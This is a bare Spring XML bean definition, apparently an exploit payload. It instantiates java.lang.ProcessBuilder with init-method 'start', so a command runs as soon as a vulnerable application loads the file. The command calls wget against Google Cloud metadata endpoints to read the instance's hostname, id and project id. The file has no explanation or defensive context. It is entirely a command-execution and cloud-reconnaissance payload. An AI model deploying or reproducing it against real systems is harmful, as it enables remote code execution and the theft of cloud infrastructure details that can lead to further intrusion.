<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>wget</value>
        <value>http://metadata.google.internal/computeMetadata/v1/</value>
        <value>wget</value>
        <value>http://metadata/computeMetadata/v1/</value>
        <value>wget</value>
        <value>http://metadata.google.internal/computeMetadata/v1/instance/hostname</value>
        <value>wget</value>
        <value>http://metadata.google.internal/computeMetadata/v1/instance/id</value>
        <value>wget</value>
        <value>http://metadata.google.internal/computeMetadata/v1/project/project-id</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
